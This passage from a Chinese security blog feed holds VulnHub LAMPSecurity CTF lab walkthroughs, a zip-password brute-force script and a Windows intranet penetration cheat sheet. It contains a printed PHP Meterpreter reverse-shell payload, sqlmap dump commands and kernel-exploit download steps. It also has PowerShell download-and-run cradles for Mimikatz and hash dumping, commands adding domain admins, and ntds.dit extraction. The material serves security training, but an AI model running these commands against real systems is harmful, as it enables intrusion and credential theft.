src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/15.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/16.png" alt></li><li>前面查看22端口是开启的，尝试ssh登录，<a href="mailto:brian@192.168.100.11" target="_blank" rel="noopener">brian@192.168.100.11</a>，my2cents</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/17.png" alt></li><li>继续sudo su提升到root</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/18.png" alt></li><li>提权成功是因为：</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF7/19.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之LAMPSecurity-CTF6</title>
      <link href="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/"/>
      <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF6/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-LAMPSecurity-CTF6"><a href="#0x00-LAMPSecurity-CTF6" class="headerlink" title="0x00 LAMPSecurity: CTF6"></a>0x00 LAMPSecurity: CTF6</h2><ol><li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf6,85/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/lampsecurity-ctf6,85/</a></li></ol><h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol><li>netdiscover 得靶场IP：192.168.100.10</li><li>nmap</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/1.png" alt></li><li>访问80</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/2.png" alt></li><li>获取username：admin，点击Read more</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/3.png" alt></li><li>注入判断：</li><li><a href="http://192.168.100.10/?id=4" target="_blank" rel="noopener">http://192.168.100.10/?id=4</a> and 1=1</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/4.png" alt></li><li><a href="http://192.168.100.10/?id=4" target="_blank" rel="noopener">http://192.168.100.10/?id=4</a> and 1=11</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/5.png" alt></li><li>sqlmap跑：sqlmap -u “<a href="http://192.168.100.10/?id=4&quot;" target="_blank" rel="noopener">http://192.168.100.10/?id=4&quot;</a> –dbs –batch</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/6.png" alt></li><li>sqlmap -u “<a href="http://192.168.100.10/?id=4&quot;" target="_blank" rel="noopener">http://192.168.100.10/?id=4&quot;</a> -D cms –tables –batch</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/7.png" alt></li><li>sqlmap -u “<a href="http://192.168.100.10/?id=4&quot;" target="_blank" rel="noopener">http://192.168.100.10/?id=4&quot;</a> -D cms -T user –dump –batch</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/8.png" alt></li><li>获取到用户名密码：admin、adminpass，登录</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/9.png" alt></li></ol><h2 id="0x02-Two"><a href="#0x02-Two" class="headerlink" title="0x02 Two"></a>0x02 Two</h2><ol><li>扫目录：dirb <a href="http://192.168.100.10/" target="_blank" rel="noopener">http://192.168.100.10/</a></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/10.png" alt></li><li>访问可疑文件，获取到账号密码</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/11.png" alt></li></ol><h2 id="0x03-Then"><a href="#0x03-Then" class="headerlink" title="0x03 Then"></a>0x03 Then</h2><ol><li>管理面板有增加事件功能</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/12.png" alt></li><li>msfvenom生成php反弹shell：msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -o test.php</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/13.png" alt></li><li>启动msfconsole，开启监听</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/15.png" alt></li><li>上传反弹shell脚本</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/14.png" alt></li><li>返回home目录</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/16.png" alt></li><li>已反弹shell</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/17.png" alt></li></ol><h2 id="0x04-Test"><a href="#0x04-Test" class="headerlink" title="0x04 Test"></a>0x04 Test</h2><ol><li>搜索脚本</li><li><a href="https://www.exploit-db.com/exploits/8478" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/8478</a></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/18.png" alt></li><li>上传脚本，利用</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/19.png" alt></li><li>翻车</li></ol><h2 id="0x05-Again"><a href="#0x05-Again" class="headerlink" title="0x05 Again"></a>0x05 Again</h2><ol><li>报错</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/20.png" alt></li><li>需要安装dos2unix来转换格式：</li><li><ul><li>yum -y install dos2unix</li></ul></li><li><ul><li>apt-get install dos2unix</li></ul></li><li>转换：</li><li><ul><li>dos2unix 8478.sh</li></ul></li><li>转换前后：</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/22.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/21.png" alt></li><li>重新上传，提权</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF6/23.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之LAMPSecurity-CTF5</title>
      <link href="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/"/>
      <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-LAMPSecurity-CTF5"><a href="#0x00-LAMPSecurity-CTF5" class="headerlink" title="0x00 LAMPSecurity: CTF5"></a>0x00 LAMPSecurity: CTF5</h2><ol><li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/" target="_blank" rel="noopener">靶场链接</a></li></ol><h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol><li>netdiscover查到靶场IP为192.168.100.9</li><li>nmap扫描</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/1.png" alt></li><li>开放端口很多，访问80</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/2.png" alt></li><li>打开blog，搜索NanoCMS相关漏洞</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/4.png" alt></li><li><a href="https://cxsecurity.com/issue/WLB-2009040041" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2009040041</a></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/5.png" alt></li><li>放在<a href="http://192.168.100.9/~andy/后访问" target="_blank" rel="noopener">http://192.168.100.9/~andy/后访问</a></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/3.png" alt></li><li>得 9d2f75377ac0ab991d40c91fd27e52fd，MD5解，得 shannon</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/6.png" alt></li><li>admin登录</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/7.png" alt></li><li>使用msfvenom生成php反弹shell脚本</li><li>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.100.4（kali IP） lport=4444 -f raw</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/8.png" alt><pre><code>&lt;?php /**/ error_reporting(0); $ip = &#39;192.168.100.4&#39;; $port = 4444; if (($f = &#39;stream_socket_client&#39;) &amp;&amp; is_callable($f)) { $s = $f(&quot;tcp://{$ip}:{$port}&quot;); $s_type = &#39;stream&#39;; } if (!$s &amp;&amp; ($f = &#39;fsockopen&#39;) &amp;&amp; is_callable($f)) { $s = $f($ip, $port); $s_type = &#39;stream&#39;; } if (!$s &amp;&amp; ($f = &#39;socket_create&#39;) &amp;&amp; is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = &#39;socket&#39;; } if (!$s_type) { die(&#39;no socket funcs&#39;); } if (!$s) { die(&#39;no socket&#39;); } switch ($s_type) { case &#39;stream&#39;: $len = fread($s, 4); break; case &#39;socket&#39;: $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#39;len&#39;]; $b = &#39;&#39;; while (strlen($b) &lt; $len) { switch ($s_type) { case &#39;stream&#39;: $b .= fread($s, $len-strlen($b)); break; case &#39;socket&#39;: $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS[&#39;msgsock&#39;] = $s; $GLOBALS[&#39;msgsock_type&#39;] = $s_type; if (extension_loaded(&#39;suhosin&#39;) &amp;&amp; ini_get(&#39;suhosin.executor.disable_eval&#39;)) { $suhosin_bypass=create_function(&#39;&#39;, $b); $suhosin_bypass(); } else { eval($b); } die();</code></pre></li><li>New Page</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/9.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/10.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/11.png" alt></li><li>开启msfconsole并设置监听，点击test</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/12.png" alt></li><li>查看内核版本</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/13.png" alt></li><li>使用脚本搜exp</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/14.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/15.png" alt></li><li>下载脚本wget <a href="https://www.exploit-db.com/download/9479" target="_blank" rel="noopener">https://www.exploit-db.com/download/9479</a> ，编译</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/16.png" alt></li><li>meterpreter上传脚本</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/17.png" alt></li><li>执行exp，失败</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/18.png" alt></li><li>使用gcc -m32 -o exp1 9479.c，重新编译为32位</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/19.png" alt></li><li>重新上传，执行</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/20.png" alt></li></ol><h2 id="0x02-webmail"><a href="#0x02-webmail" class="headerlink" title="0x02 webmail"></a>0x02 webmail</h2><ol><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/23.png" alt></li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/21.png" alt></li><li>搜索相关漏洞</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF5/22.png" alt></li><li><a href="https://www.freebuf.com/vuls/133992.html" target="_blank" rel="noopener">其他参考</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之LAMPSecurity-CTF4</title>
      <link href="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/"/>
      <url>/vulnhub%E4%B9%8BLAMPSecurity-CTF4/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-LAMPSecurity：CTF4"><a href="#0x00-LAMPSecurity：CTF4" class="headerlink" title="0x00 LAMPSecurity：CTF4"></a>0x00 LAMPSecurity：CTF4</h2><ol><li><a href="https://www.vulnhub.com/entry/lampsecurity-ctf4,83/" target="_blank" rel="noopener">靶场链接</a></li><li>kali</li></ol><h2 id="0x01-Do"><a href="#0x01-Do" class="headerlink" title="0x01 Do"></a>0x01 Do</h2><ol><li>netdiscover</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/1.png" alt></li><li>nmap</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/2.png" alt></li><li>开启22、25、80</li><li>访问80</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/3.png" alt></li><li>各种翻，找到mysql错误信息</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/4.png" alt></li><li>sqlmap跑：sqlmap -u “<a href="http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;" target="_blank" rel="noopener">http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</a> –dbs –batch</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/5.png" alt></li><li>枚举所有数据库里的数据表</li><li>sqlmap -u “<a href="http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;" target="_blank" rel="noopener">http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</a> -D ehks –tables –dump</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/6.png" alt></li><li>sqlmap -u “<a href="http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;" target="_blank" rel="noopener">http://192.168.10.2/index.html?page=blog&amp;title=Blog&amp;id=2&quot;</a> -D ehks -T user –dump</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/7.png" alt></li><li>使用其中一个用户来登录，如第一个dstevens，ilike2surf</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/8.png" alt></li><li>登录成功</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/9.png" alt></li><li>直接sudo su，输入密码，升到root权限</li><li><img src="/vulnhub%E4%B9%8BLAMPSecurity-CTF4/10.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python小脚本</title>
      <link href="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
      <url>/python%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-小脚本处理-pcapng文件"><a href="#0x01-小脚本处理-pcapng文件" class="headerlink" title="0x01 小脚本处理.pcapng文件"></a>0x01 小脚本处理.pcapng文件</h2><ol><li>关键字：DNS、多重base</li><li><img src="/python%E5%B0%8F%E8%84%9A%E6%9C%AC/1.png" alt><pre><code>a=[]with open(&quot;1.pcapng&quot;,&quot;rb&quot;) as file1: data=file1.read() flag=&#39;F=&quot;&#39; while True:     try:         start=data.index(flag)+len(flag)         data=data[start:]         end=data.index(&#39;&quot;&#39;)         a.append(data[:end])     except:         breakwith open(&quot;1.txt&quot;,&quot;w&quot;) as file2: file2.write(&quot;&quot;.join([a[i]+&quot;\n&quot; for i in range(len(a))]))</code></pre></li></ol><h2 id="0x02-zipfile爆破zip文件"><a href="#0x02-zipfile爆破zip文件" class="headerlink" title="0x02 zipfile爆破zip文件"></a>0x02 zipfile爆破zip文件</h2><pre><code>#coding:utf-8import zipfileimport threadingdef zipbp(zfile,pwd):    try:        zfile.extractall(pwd=pwd)  #密码解压        print &#39;password is: %s&#39;%pwd    except:        returndef main():    zfile=zipfile.ZipFile(&#39;1.zip&#39;)  #用于读取zip文件    pwdall=open(&#39;pass.txt&#39;)  #读字典    for pwd in pwdall.readlines():  #读字典的每行        pwd=pwd.strip(&#39;\n&#39;)  #去掉换行符        t=threading.Thread(target=zipbp,args=(zfile,pwd))  #多线程爆破        t.start()  #启动线程if __name__ == &#39;__main__&#39;:    main()</code></pre><pre><code>#coding:utf-8import zipfileimport threadingimport optparseimport sysdef zipbp(zfile,pwd):    try:        zfile.extractall(pwd=pwd)  #密码解压        print &quot;password is: %s&quot;%pwd    except:        returndef main():    Usage=&quot;python &quot;+ sys.argv[0]+&quot; -f &lt;zipfile&gt; -d &lt;dictionary&gt;&quot;    parser=optparse.OptionParser(Usage)    parser.add_option(&#39;-f&#39;,dest=&#39;zip_name&#39;,type=&#39;string&#39;,help=&#39;zip file&#39;)    parser.add_option(&#39;-d&#39;,dest=&#39;dictionary_name&#39;,type=&#39;string&#39;,help=&#39;dictionary file&#39;)    options,args=parser.parse_args()    if options.zip_name is None or options.dictionary_name is None:        print parser.usage         exit(0)    else:        zip_name=options.zip_name        dictionary_name=options.dictionary_name    zfile=zipfile.ZipFile(zip_name)  #用于读取zip文件    pwdall=open(dictionary_name)  #读字典    for pwd in pwdall.readlines():  #读字典的每行        pwd=pwd.strip(&#39;\n&#39;)  #去掉换行符        t=threading.Thread(target=zipbp,args=(zfile,pwd))  #多线程爆破        t.start()  #启动线程if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透之windows</title>
      <link href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/"/>
      <url>/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-内网渗透"><a href="#0x00-内网渗透" class="headerlink" title="0x00 内网渗透"></a>0x00 内网渗透</h2><ol><li>顾名思义：在内部局域网做渗透。</li></ol><hr><h2 id="0x10-系统相关命令"><a href="#0x10-系统相关命令" class="headerlink" title="0x10 系统相关命令"></a>0x10 系统相关命令</h2><ol><li>systeminfo #系统信息</li><li>set #环境变量</li><li>netsh firewall show config #显示防火墙配置</li><li>netsh firewall show state #显示防火墙状态</li><li>ver #查看windows版本</li><li>chdir #查看当前路径</li><li>dir #列出当前目录及文件</li></ol><hr><h2 id="0x11-网络相关命令"><a href="#0x11-网络相关命令" class="headerlink" title="0x11 网络相关命令"></a>0x11 网络相关命令</h2><ol><li>ipconfig /all #显示网络详细信息</li><li>ipconfig /displaydns #查看DNS缓存</li><li>route print #路由信息，netstat -r同样效果</li><li>arp -a #查看arp表</li><li>netstat -ano #网络连接信息</li><li>net share #查看已开启共享</li><li><code>REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code> #查看RDP端口状况</li><li><ul><li>回显：PortNumber    REG_DWORD    0xd3d</li></ul></li><li><code>REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v [项的名称] /t REG_DWORD /d [项的值] /f</code> #add：新建，/v：项的名称，/d：项的值，/f：强制</li><li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code> #开启3389</li><li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x344D /f</code> #更改默认端口3389为13389</li><li><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x344D /f</code> #更改默认端口3389为13389</li><li>一行命令扫描存活IP：<code>for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code></li><li>一行命令扫描存活IP输出到文件：@for /l %i in (1,1,255) do @ping -n 1 -w 1 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\ips_dead.txt) else (echo 192.168.0.%i &gt;&gt;c:\ips_alive.txt)</li></ol><hr><h2 id="0x12-进程及服务"><a href="#0x12-进程及服务" class="headerlink" title="0x12 进程及服务"></a>0x12 进程及服务</h2><ol><li>tasklist #查看进程列表及PID</li><li>net start #查看当前运行的服务</li><li>netstat -ano #网络连接信息</li></ol><hr><h2 id="0x13-用户相关命令"><a href="#0x13-用户相关命令" class="headerlink" title="0x13 用户相关命令"></a>0x13 用户相关命令</h2><ol><li>whoami #当前用户</li><li>net user #列出本地所有用户</li><li>net1 user #列出本地所有用户</li><li>query user #查看远程主机在线用户</li><li>quser #查看远程主机在线用户</li><li>net localgroup administrators #查看本机管理员</li><li>net1 localgroup administrators #查看本机管理员</li></ol><hr><h2 id="0x14-文件相关"><a href="#0x14-文件相关" class="headerlink" title="0x14 文件相关"></a>0x14 文件相关</h2><ol><li><code>type c:\windows\system32\drivers\etc\hosts</code> #查看hosts文件</li></ol><hr><h2 id="0x20-域信息搜集命令一"><a href="#0x20-域信息搜集命令一" class="headerlink" title="0x20 域信息搜集命令一"></a>0x20 域信息搜集命令一</h2><ol><li><strong>域：Windows网络中独立运行的单位。域之间相互访问则需要建立信任关系（Trust Relation）。</strong></li><li>net config workstation #查看当前域</li><li>net accounts #查看本地密码策略</li><li>net accounts /domain #查看域密码策略</li><li>net use #查看网络连接</li><li><code>net user /domain #查看域用户</code></li><li>net group /domain #查看域组</li><li>net time /domain #查看域时间</li><li>net time \computername/IP #查看目标的时间</li><li>net view #显示域、计算机或由指定计算机共享资源的列表</li><li>net view \ip #查看某IP共享</li><li>net view /domain #查询域列表</li><li>net view /domain:[domain_name] #显示域、计算机或由指定计算机共享资源的列表</li><li>net localgroup administrators /domain #查看域管理员</li><li>net group “domain computers” /domain #查看域成员列表（计算机名）</li><li><code>net group &quot;domain admins&quot; /domain #查看域管理员用户组</code></li><li><code>net group &quot;domain controllers&quot; /domain #查看域控主机</code></li><li><code>ping 域控主机[无$] #获取域控IP</code></li><li>net user [username] [password] /add /domain #添加普通域用户</li><li>net group “domain admins” [username] /add /domain #提升到域管理员</li><li>net localgroup administrators workgroup\user001 /add #本机添加域用户</li><li><code>dsquery server #查找域主机</code></li><li><code>ping 域控主机名 #获取域控IP</code></li><li>ping dcserver</li><li>nltest /domain_trusts #查看域信任</li><li>net session #查看当前会话</li></ol><hr><h2 id="0x21-域信息搜集命令二"><a href="#0x21-域信息搜集命令二" class="headerlink" title="0x21 域信息搜集命令二"></a>0x21 域信息搜集命令二</h2><ol><li><code>setspn -T domain.com -Q */*</code> #windows自带的setspn工具</li><li><code>cscript GetUserSPNs.vbs</code></li><li><code>Rubeus.exe kerberoast</code></li><li><strong>windows版：</strong></li><li>nslookup -type=ns [domain] #域传送</li><li>nslookup</li><li>server dns.[domain]</li><li>ls [domain]</li><li><strong>Linux版：</strong></li><li>dig @dns.[domain] axfr [domain]</li></ol><hr><h2 id="0x22-域信息搜集命令三"><a href="#0x22-域信息搜集命令三" class="headerlink" title="0x22 域信息搜集命令三"></a>0x22 域信息搜集命令三</h2><ol><li>driverquery #查看安装的驱动</li><li><code>for /f  &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</code> #一行命令获取连接过的WiFi密码</li></ol><hr><h2 id="0x23-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）"><a href="#0x23-wmic（Windows-Management-InstrumentationCommand-Line：Windows管理规范命令行）" class="headerlink" title="0x23 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）"></a>0x23 wmic（Windows Management InstrumentationCommand Line：Windows管理规范命令行）</h2><ol><li>wmic product list brief #列出所有安装程序与版本信息</li><li>wmic service list brief #列出所有服务</li><li>wmic process list brief #列出所有进程</li><li>wmic startup list brief #列出开机启动项</li><li>wmic useraccount list brief #列出用户</li><li>wmic sysaccount list brief #列出系统账户</li><li>wmic qfe get Caption,Description,HotFixID,InstalledOn #查看补丁连接，描述，编号，安装时间</li><li>wmic os #查看操作系统类型</li><li>wmic /node:IP /user:[username] /password:[password] </li></ol><hr><h2 id="0x24-GPP-组策略选项"><a href="#0x24-GPP-组策略选项" class="headerlink" title="0x24 GPP 组策略选项"></a>0x24 GPP 组策略选项</h2><ol><li>当分发组策略时，会在域的sysvol目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。</li><li>xml中的密码是aes加密的，密钥：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></li><li>解密脚本：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></li><li>域用户登录脚本存在目录也会存在敏感文件：\\domain\Netlogon</li></ol><hr><h2 id="0x30-域中获取账号后"><a href="#0x30-域中获取账号后" class="headerlink" title="0x30 域中获取账号后"></a>0x30 域中获取账号后</h2><ol><li><strong>工具：</strong></li><li><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec" target="_blank" rel="noopener">psexec.exe/psexec64.exe</a>：windows工具，允许执行远程系统上安装的程序</li><li>命令：<code>psexec.exe \\远程主机IP -u [username] -p [password] -h cmd /c &quot;[commands]&quot;</code></li><li>例子：<code>PsExec64.exe \\192.168.100.6 -u administrator -p Admin123 cmd</code> #内网远程登录服务器</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/1.png" alt></li><li><code>psexec -s \\IP -u [username] -p [password] cmd</code> #返回system权限shell</li><li><code>psexec -accepteula @ips.txt -u [username] -p [password] -c 1.bat</code> #批量登录</li><li><code>tasklist /v | find [username]</code>  #查找关于某用户进程，存在说明某用户登录过</li><li><code>net use \\IP\C$ /user:[username] [password]</code> #建立非空连接</li><li><code>net use \\IP\IPC$ [password] /user:[username]</code> #建立非空连接</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/2.png" alt></li><li><code>net use \\IP\IPC$ &quot;&quot; /user:[username]</code>  #建立空连接</li><li><code>dir \\IP\c$</code> #列目录</li><li><code>net use z: \\IP\c$ /user:[username] [password]</code> #映射盘符C盘到本地Z盘</li><li>nbtstat -A IP #windows命令查看远程主机的用户名列表</li><li>nbtscan -vh IP #Linux命令查看远程主机的用户名列表</li><li><code>net use \\IP\c$ /del</code> #删除共享链接</li><li><code>net use * /del</code> #删除共享映射</li><li><code>net time \\computername/IP</code> #查看目标的时间</li><li><code>at \\[computername/ip] 23:59 %path%\file</code> #计划任务执行文件 </li><li><code>at \\IP 17:06 &quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot;</code></li><li><code>copy f:\\1.txt \\IP\c$</code> #复制文件到服务器C盘</li><li><code>copy \\IP\c$\1.txt f:\\1.txt</code> #复制文件到本地</li><li><strong>抓明文：</strong></li><li><code>powershell iex(new-object net.webclient).downloadstring(&#39;url/Invoke-Mimikatz.ps1&#39;);invoke-mimikatz-dumpcerts</code></li><li><strong>抓hash：</strong></li><li><code>powershell iex(new-object net.webclient).downloadstring(&#39;url/Get-PassHashes.ps1&#39;);get-passhashes</code></li></ol><hr><h2 id="0x40-Getshell到域控"><a href="#0x40-Getshell到域控" class="headerlink" title="0x40 Getshell到域控"></a>0x40 Getshell到域控</h2><ol><li>vssadmin.exe：系统自带创建/删除windows驱动器的卷影副本的工具</li><li>检查是否存在C盘的卷影副本可用：</li><li>vssadmin.exe list shadows</li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/3.png" alt></li><li>有时候命令无法回显，如webshell，可直接输出到txt文件，或使用psexec.exe执行命令输出到txt文件</li><li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;vssadmin list shadows &gt; \\192.168.0.104\C$\1.txt&quot;</code></li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/4.png" alt></li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/5.png" alt></li><li>没有！自建C盘的卷影副本，来窃取ntds.dit和system文件</li><li>vssadmin create shadow /for=C: &gt; 1.txt</li><li>使用psexec执行：</li><li><code>psexec64.exe \\192.168.0.104 -u administrator -p 123456 -h cmd /c &quot;vssadmin create shadow /for=C: &gt; \\192.168.0.104\C$\1.txt&quot;</code></li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/6.png" alt></li><li><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bwindows/7.png" alt></li><li><strong>域用户hash提取（在域控上执行）：</strong></li><li>ntdsutil——snapshot——activate instance ntds——create——mount {guid}——copy 盘符:\windows\NTDS\ntds.dit C:\ntds_save.dit</li><li>删除装载点：unmount {guid}—delete {guid}–quit</li><li>QuarksPwDump.exe –dump-hash-domain –ntds-file c:\ntds_save.dit #配合ntdsutil导出域用户hash</li></ol><pre><code>成功地创建了 &#39;C:\&#39; 的卷影副本    卷影副本 ID: {984c45fc-94c2-4de6-adcc-59d266ce5913}    卷影副本卷名: 